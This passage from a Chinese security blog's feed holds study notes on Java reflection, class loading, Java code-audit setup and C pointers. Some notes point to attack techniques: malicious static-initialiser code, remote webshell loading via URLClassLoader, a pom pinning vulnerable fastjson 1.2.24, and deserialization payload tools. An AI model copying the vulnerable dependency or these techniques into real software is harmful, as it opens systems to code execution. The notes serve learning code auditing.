src="https://gitee.com/lcdm123/image/raw/master/image-20211012125858616.png" alt="image-20211012125858616"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132531112.png" alt="image-20211012132531112"></p><p>所以对于一般的情况，我们需要使用 <code>getRuntime()</code> 函数来实例化这个类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132929569.png" alt="image-20211012132929569"></p><p>使用反射调用 <code>exec()</code></p><p>第一种方法：调用私有构造函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012134851725.png" alt="image-20211012134851725"></p><p>第二种方法：调用 <code>getRuntime()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012135057941.png" alt="image-20211012135057941"></p><blockquote><p><code>getRuntime()</code> 函数的返回一个 Runtime  类</p></blockquote><h2 id="ProcessBuilder类使用"><a href="#ProcessBuilder类使用" class="headerlink" title="ProcessBuilder类使用"></a>ProcessBuilder类使用</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154708889.png" alt="image-20211012154708889"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154732739.png" alt="image-20211012154732739"></p><p>根据类的构造方法实例化类，通过<code>start()</code>方法执行命令即可，只需要一个参数就可以了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012155047493.png" alt="image-20211012155047493"></p><h2 id="深度测试"><a href="#深度测试" class="headerlink" title="深度测试"></a>深度测试</h2><p>是否会对类初始化的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012151219874.png" alt="image-20211012151219874"></p><p>在使用 <code>forname()</code> 时，构造函数并不会执行，即使我们设置 <code>initialize=true</code>，这里的初始化指的就是类的初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrainPrint</span> </span>&#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;代码块！！！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块！！！&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrainPrint</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的 初始化方法的区别，调用顺序，安全上的价值？</p><p>首先调用的是 <code>static&#123;&#125;</code> 其次是 <code>&#123;&#125;</code> 最后是 构造函数</p><p><code>static&#123;&#125;</code> 是类初始化的时候调用，<code>&#123;&#125;</code>中的代码会放在构造函数的 <code>super()</code> 后面，在当前构造函数前面，所以 <code>forName</code> 中的 <code>initialize=true</code> 其实就是告诉 java 虚拟机是否执行类初始化。</p><p>攻击者编写一个恶意类代码放进 <code>static&#123;&#125;</code> 中，就会在执行 <code>forName()</code> 方法的时候自动调用</p><p>……………… 更多待学</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java 反射机制是 Java 动态性的重要体现，利用反射机制可以对 Java 的类实现动态调用。Java 的大部分框架都是利用反射编写的，利用 Java 的反射在漏洞利用中有重大作用</p><p>学习文章</p><p>P神代码审计牛逼！！！</p><p><a href="https://m0nit0r.top/2020/06/07/java-deserialize-learn2/">https://m0nit0r.top/2020/06/07/java-deserialize-learn2/</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java类加载</title>
    <link href="/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <url>/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 程序是由 class 文件组成的一个完整的应用程序，再运行程序时，并不会一次性加载所有的 class 文件进入内存，而是通过 java 的类加载机制进行动态加载，从而转换为 <code>java.lang.Class</code> 的一个实例</p><p>Java 代码需要先编译为 Class 字节码，然后被虚拟机解释执行，把字节码从 Class 文件（或者其他外部来源）加载到内存，并形成可能被 JVM 直接使用得结构数据，这一过程就是类加载</p><p>加载类的过程可以分为：加载、链接（验证 准备 解析）、初始化</p><p>加载===&gt;验证====&gt;准备====&gt;解析====&gt;初始化</p><p>Java 类初始化的时候会调用 <code>java.lang.ClassLoder</code> 加载类字节码，<code>ClassLoader</code> 会调用 JVM 的native方法来定义一个 <code>java.lang.Class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211007203744816.png" alt="image-20211007203744816"></p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>这里父类加载器不是通过继承关系来实现的，而是采用组合实现的</p><p>站在JVM虚拟机的角度讲只存在两种类加载器：</p><ul><li>启动类加载器：使用C++实现</li><li>其他类加载器：使用 java 语言实现</li></ul><p>开发人员角度存在三种类加载器：</p><ul><li>根类加载器</li><li>扩展类加载器</li><li>系统类加载器</li></ul><h3 id="根类加载器（Bootstrap）"><a href="#根类加载器（Bootstrap）" class="headerlink" title="根类加载器（Bootstrap）"></a>根类加载器（Bootstrap）</h3><p>根类加载器是最低层得类加载器，是虚拟机得一部分，它是由C++语言实现得，并且没有父类加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性 <code>sun.boot.class.path</code> 指定得路径下得核心类库。根类加载器只加载<code>java，javax，sun</code>开头的类。</p><h3 id="扩展类加载器（Extension）"><a href="#扩展类加载器（Extension）" class="headerlink" title="扩展类加载器（Extension）"></a>扩展类加载器（Extension）</h3><p><code>ExtClassLoader</code>父加载器是根类加载器</p><h3 id="系统类加载器（System）"><a href="#系统类加载器（System）" class="headerlink" title="系统类加载器（System）"></a>系统类加载器（System）</h3><p><code>AppClassLoader</code> 应用类加载器，默认的类加载器，父类是扩展类加载器。</p><blockquote><p>java虚拟机对class文件采用的是按需加载的方式，当需要使用该类的时候才会把class文件加载到内存生成class对象。</p><p>加载某个类的class文件时，java虚拟机采用的是双亲委派模式，即把加载类的请求交给父加载器处理，是一种任务委派模式。</p></blockquote><h3 id="JVM类加载机制"><a href="#JVM类加载机制" class="headerlink" title="JVM类加载机制"></a>JVM类加载机制</h3><ul><li>全盘负责：当一个类加载器负责加载某个 Class 时，该 Class 所依赖的和引用的其他 Class 也将由该类加载器负责载入，除非显示的使用另外一个类加载器来载入</li><li>父类委托：让父类加载器试图加载该类，只有父类无法完成时才尝试使用自己路径中的加载器</li><li>缓存机制：将所有的加载过的 Class 都缓存，程序使用某个 Class 时，类加载器先从缓存区寻找该类的 Class，只有缓存区不存在时系统才会读取该类的二进制数据，并将其转换成 Class 对象，存入缓存区。</li></ul><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>加载器比较懒，喜欢把东西交给父类加载，父类加载不了时就会向下委派</p><p>意义：</p><ul><li>系统类防止内存出现多份同样的字节码</li><li>保证 java 程序安全稳定运行</li></ul><h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><ol><li>命令行启动时由 JVM 初始化加载</li><li>通过 Class.forName() 方法动态加载</li><li>通过 ClassLoader.LoadClass() 方法动态加载</li></ol><blockquote><p>区别就是对于初始化块的处理</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211008011053894.png" alt="image-20211008011053894"></p><h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><blockquote><p>除了根类加载器的所有的类加载器都必须继承<code>java.lang.ClassLoader</code>它是一个抽象类</p></blockquote><p>某些时候我们获取一个类的类加载器时可能会返回一个 null 值，因为 <code>Bootstrap Loader</code>(引导类加载器)是用C语言实现的，找不到一个确定的返回父类Loader的方式，于是就返回NULL</p><p><code>getParent(String name)</code>方法 （返回该类加载器的父类加载器）</p><p><code>loadClass(String name)</code>方法（加载指定的 java 类）</p><p><code>findClass(String name)</code>方法（查找指定的类）</p><p><code>findLoadedClass(String name)</code>方法（查找 JVM 已经加载过的类）</p><p><code>defineClass(String name)</code>方法（ 定义一个java类 ）</p><p><code>resolveClass(String name)</code>方法 （链接指定的 java 类）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211007235659052.png"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><blockquote><p>能够从本地或者网络上指定位置加载类</p></blockquote><p>默认父类加载器是系统类加载器，它拥有从远程服务器上加载类的能力，通过 <code>URLClassLoader</code> 可以实现对一些webshell 的远程加载，对某个漏洞的深入利用</p><h2 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h2><p>通常情况下我们会使用系统类加载器，但是有时候会自定义类加载器，比如通过网络传输 java 类的字节码，为了保证安全需要对字节码进行加密处理，这时系统类加载器就无法完成工作。</p><p>一般自定义类加载器的步骤</p><ol><li>继承<code>CLassLoader</code></li><li>重写<code>findClass</code>方法</li></ol><p>需要注意的点：</p><ul><li>最好不要重写 loadClass 方法，这样容易破坏双亲关系</li></ul><p>学习文章</p><p><a href="https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md">https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03">https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java审计入门</title>
    <link href="/2021/10/10/Java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"/>
    <url>/2021/10/10/Java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-代码审计入门"><a href="#Java-代码审计入门" class="headerlink" title="Java 代码审计入门"></a>Java 代码审计入门</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><h4 id="对Jar-远程调试"><a href="#对Jar-远程调试" class="headerlink" title="对Jar 远程调试"></a>对Jar 远程调试</h4><p>新建一个 Java 项目文件，新建一个 lib 包，将 jar 项目文件放入 lib 中，然后点击 “add as Library……”</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120523043.png" alt="image-20211006120523043"></p><p>然后创建远程调试 <code>Add Configuration……</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120752382.png" alt="image-20211006120752382"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120832600.png" alt="image-20211006120832600"></p><p>调试成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006121110049.png" alt="image-20211006121110049"></p><blockquote><p>其他类似于 Weblogic  Tomcat 的调试，操作步骤大致一样，额外的点在以后调试的时候再写吧</p></blockquote><h3 id="项目构建工具"><a href="#项目构建工具" class="headerlink" title="项目构建工具"></a>项目构建工具</h3><h4 id="Maven-基础知识及掌握"><a href="#Maven-基础知识及掌握" class="headerlink" title="Maven 基础知识及掌握"></a>Maven 基础知识及掌握</h4><p>Maven 项目中最主要的就是 pom.xml 文件，pom.xml 文件描述了项目的 Maven 坐标、依赖关系、开发者需要准寻的规则、缺陷管理系统、组织以及 license，还有其他所有的项目相关因素，依靠它我们可以审查当前 java 应用程序是否使用了存在安全隐患的组件，以及快速搭建特定的漏洞环境。</p><p>例如快速搭建版本小于1.24的 fastjson 环境</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maventest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006163733487.png" alt="image-20211006163733487"></p><p>之后组件就被下载至本地并且加入项目依赖中，可以再项目代码中使用组件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006164430001.png" alt="image-20211006164430001"></p><h4 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h4><p>Swagger 是一个开源软件框架，可以帮助开发人员设计、构建、记录和使用 Restful Web 应用，它将代码和文档融为一体。</p><h2 id="代码审计辅助工具"><a href="#代码审计辅助工具" class="headerlink" title="代码审计辅助工具"></a>代码审计辅助工具</h2><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><p>Sublime</p><p>IDEA</p><p>Eclipse</p><h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><p>Burp Suite</p><p>SwitchyOmega</p><p>Max HackBar</p><p>Postman</p><p>PostWomen</p><p>Tamper Data</p><p>Ysoserial</p><blockquote><p>Ysoserial 是一款开源的 java 反序列化测试工具，内部集成了多种利用链，可以快速生成用于攻击的代码</p></blockquote><p>Marshalsec</p><blockquote><p>Marshalsec 是一款开源的 java 反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动而已的 RMI 服务</p></blockquote><p>MySQL 日志查询工具</p><p>MySQL Monitor</p><p>Beyond Compare</p><blockquote><p>文件比较工具，比较范围包括目录、文档内容</p></blockquote><h3 id="反编译工具"><a href="#反编译工具" class="headerlink" title="反编译工具"></a>反编译工具</h3><p>JD-GUI</p><p>FernFlower</p><blockquote><p>FernFlower 反编译工具的功能比 JD-GUI 更强大，反编译失败的时候会生成空的 java 文件</p></blockquote><p>CFR</p><p>Intellij IDEA</p><blockquote><p>IDEA 反编译工具能够自动捷豹已添加的依赖的 jar 包，并对其内容进行反编译</p></blockquote><h3 id="Java-代码静态扫描工具"><a href="#Java-代码静态扫描工具" class="headerlink" title="Java 代码静态扫描工具"></a>Java 代码静态扫描工具</h3><p>Fortify SCA</p><p>VCG</p><p>FindBugs 与 FindSecBugs 插件</p><blockquote><p>在 IDEA 和 Eclipse 中都可以安装</p></blockquote><p>SpotBugs</p><blockquote><p>SpotBugs 和 FindBugs 用法基本一样，可以独立使用也可以作为插件，需要运行在 JDK 1.8 以上的版本</p></blockquote><h3 id="公开漏洞平台"><a href="#公开漏洞平台" class="headerlink" title="公开漏洞平台"></a>公开漏洞平台</h3><p>CVE</p><p>NVD</p><p>CNVD</p><p>CNNVD</p><h2 id="Java-EE-基础知识"><a href="#Java-EE-基础知识" class="headerlink" title="Java EE 基础知识"></a>Java EE 基础知识</h2><h4 id="Java-EE-的核心技术"><a href="#Java-EE-的核心技术" class="headerlink" title="Java EE 的核心技术"></a>Java EE 的核心技术</h4><p>Java 数据库连接（JDBC）：在 Java 语言中用来规范客户程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法</p><p>Java 命名和目录接口（JNDI）：Java的一个目录服务应用程序界面（API），它提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象</p><p>企业级 JavaBean（EJB）：用来构筑企业级应用的、在服务器端可被管理的组件</p><p>远程方法调用（RMI）：Java 的一组用户开发分布式应用程序的 API </p><p>Servlet（Server Applet）：是使用 java 编写的服务器端程序。狭义的是指java 语言实现的一个接口，广义的是真任何实现该 Servlet 接口的类。其主要作用在于交互式地浏览和修改数据，生成动态 Web 内容</p><p>JSP：动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送地请求，并根据请求内容动态生成 HTML XML 或者其他格式文档地 Web 网页，然后返回给请求者</p><p>可扩展标记语言（XML）：用于传输和存储数据地语言</p><p>Java 消息服务（JMC）：一个Java 平台中关于面向消息中间件（MOM）的API，用于在连个应用程序之间或者分布式系统之间发送消息，进行异步通信</p><h4 id="Java-EE-分层模型"><a href="#Java-EE-分层模型" class="headerlink" title="Java EE 分层模型"></a>Java EE 分层模型</h4><p>Java EE 应用的分层模型主要分为以下 5 层</p><ul><li>Domain Object（领域对象）层：本层由一系列 POJO（Plain Old Java Object，普通的，传统的java对象）组成，这些对象是该系统的 Domain Object，通常包含各自所需实现的业务逻辑方法</li><li>DAO（Data Access Object 数据访问对象）层：本层由一系列 DAO 组件组成，这些DAO 实现了对数据的创建、查询、更新和删除等操作</li><li>Service（业务逻辑）层：本层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法</li><li>Controller（控制器）层：本层由一系列的控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的 view 组件转发</li><li>View（表现）层：本层由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果</li></ul><h4 id="MVC模式与MVC框架"><a href="#MVC模式与MVC框架" class="headerlink" title="MVC模式与MVC框架"></a>MVC模式与MVC框架</h4><p>MVC 的目的就是将 M 和 V 实现代码分离，利用 C 确保 M 和 C 的同步</p><p>Model：携带数据的对象活 Java POJO 即使模型内数据改变也具有逻辑来更新控制器</p><p>Controller：表示逻辑控制，控制器对模型和视图都有作用，控制数据流入模型对象，并在数据更改时更新视图，是视图和模型的中间层</p><p>View：模型包含的数据的可视化层</p><p>MVC的工作流程：Controller 层接收用户的请求，并决定应该调用哪个 Model 来进行处理；然后，由 Model 使用逻辑处理用户的请求并返回数据，最后 View 经数据呈现个用户。</p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C学习基础</title>
    <link href="/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/09/27/C%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="C学习"><a href="#C学习" class="headerlink" title="C学习"></a>C学习</h1><p>[toc]</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>与 C++ 的函数定义差不多，返回值类型，形式参数，需要注意形式参数和实际参数的类型一致性</p><p>主调参数把它的参数值存储在栈区域，被调函数从栈区读取参数</p><p>函数的重要操作：递归</p><p>递归的条件：</p><ul><li>一个问题可分</li><li>把问题分解为规模不同的子问题</li><li>存在中止条件</li></ul><p>递归的基本问题：斐波拉契数列，阶乘，汉诺塔问题，快速排序法</p><p>函数的返回类型和形参列表构成了函数的签名</p><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><blockquote><p>数组指针与 C++ 也基本一样</p></blockquote><p>指针：用于存储变量的地址</p><p>的<code>scanf()</code>函数中就使用地址作为参数，<code>&amp;</code> 取地址，<code>%p</code> 输出地址的转换说明</p><p><code>* </code> 取出指针指向地址的值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920153342073.png" alt="image-20210920153342073"></p><blockquote><p>函数中使用指针传递参数可以直接修改原来的值，比如直接修改数组值等</p><p>指针只能指向声明为统一类型的参数的地址</p></blockquote><p>数组是由同一类型的元素组成</p><p><strong>指针与数组的联合使用</strong></p><p>数组名是数组元素的首地址</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> a[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>a = &amp;a[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>我们可以直接把它赋值给指针，这样就可以利用指针来控制数组</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920155310432.png" alt="image-20210920155310432"></p><p><strong>指针与多维数组</strong></p><p><code>int a[5][3]</code>，这里的地址值有点绕，梳理一下</p><p>a 是二维数组的首地址，<code>a = &amp;a[0]</code> , <code>a[0] == &amp;a[0][0]</code> 所以 <code>*a == &amp;a[0][0]</code> <code>**a == *&amp;a[0][0]</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920162429971.png" alt="image-20210920162429971"></p><p>指针配合多维数组</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920163126063.png" alt="image-20210920163126063"></p><p><strong>函数 数组与指针</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">// 函数声明<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span> a[][<span class="hljs-number">4</span>], <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br><span class="hljs-built_in">int</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>* a, <span class="hljs-built_in">int</span> <span class="hljs-built_in">n</span>)<br></code></pre></td></tr></table></figure><p><strong>指针的操作</strong></p><ol><li>赋值：把地址赋值给指针</li><li>解引用：<code>*</code> 取出地址中保存的值</li><li>取址：指针变量也有自己的地址和值</li><li>指针和整数相加：可以使用+运算符把指针与整数相加，或整数与指针 相加。无论哪种情况，整数都会和指针所指向类型的大小（以字节为单位） 相乘，然后把结果与初始地址相加</li><li>递增指针：递增指向数组元素的指针可以让该指针移动至数组的下一个 元素</li><li>指针减去一个整数：可以使用-运算符从一个指针中减去一个整数</li><li>指针求差：计算两个指针的差值（两个指针需要指向同一个数组，差值就为数的距离，否则会报错）</li><li>比较：使用关系运算符可以比较两个指针，前提是两个指针执行的数据类型一样</li></ol><blockquote><p>千万不要解引用未初始化的指针</p></blockquote><p><strong>变长数组</strong></p><p>C 99 中支持边长数组的声明，可以后期输入一个数来定义数组长度，但是还是习惯用 <code>malloc()</code> 来动态分配内存比较好用</p><h3 id="指针函数与函数指针"><a href="#指针函数与函数指针" class="headerlink" title="指针函数与函数指针"></a>指针函数与函数指针</h3><p>指针函数：返回值为指针的函数 <code>int *fun(int x , int y)</code></p><p>函数指针：指向函数的一个指针</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">int (*p)(int x, int y)<br>p = <span class="hljs-function"><span class="hljs-keyword">fun</span> 或者 <span class="hljs-title">p</span></span> = &amp;<span class="hljs-function"><span class="hljs-keyword">fun</span></span><br><span class="hljs-function">使用 <span class="hljs-title">p</span></span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) 或者 (*p)(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>) <br></code></pre></td></tr></table></figure><h2 id="字符操作"><a href="#字符操作" class="headerlink" title="字符操作"></a>字符操作</h2><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>回显用户输入的字符后<strong>立即重复打印该字符</strong> 是属于<strong>无缓冲（或直接）输入</strong>，即正在等待的程序可立即使用输入的字符</p><p>大部分系统在用户按下Enter键之前不会重复打印刚输入的字符，这种输入形式属于缓冲输入</p><p>用户输入的字符被收集并且储存在一个称为缓冲区的临时存储区域</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920144846310.png" alt="image-20210920144846310"></p><p>缓冲分为两类：</p><ul><li>完全缓冲：缓冲区填满时才刷新缓冲区（内容发送到目的地），通常出现在文件输入中</li><li>行缓冲：出现换行符时刷新缓冲区，通常用于键盘输入</li></ul><p>字符串是以空字符（\0）结尾的char类型数组</p><p>字符串常量也是存储在静态存储区,对于静态存储区，其中的变量常量在程序运行期间会一直存在，不会释放，且变量常量在其中只有一份拷贝，不会出现相同的变量和常量的不同拷贝。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172036442.png" alt="image-20210920172036442"></p><p>双引号括起来的内容表示指向该字符串存储位置的指针</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920170710328.png" alt="image-20210920170710328"></p><p>数组获得的是原始字符串的副本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920172303234.png" alt="image-20210920172303234"></p><p>推荐定义：<code>const char* p = &quot;lcdm123&quot;</code></p><blockquote><p>字符串的绝大多数操作都是依靠指针来完成的</p></blockquote><h3 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h3><p><strong>getchar()  putchar()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span 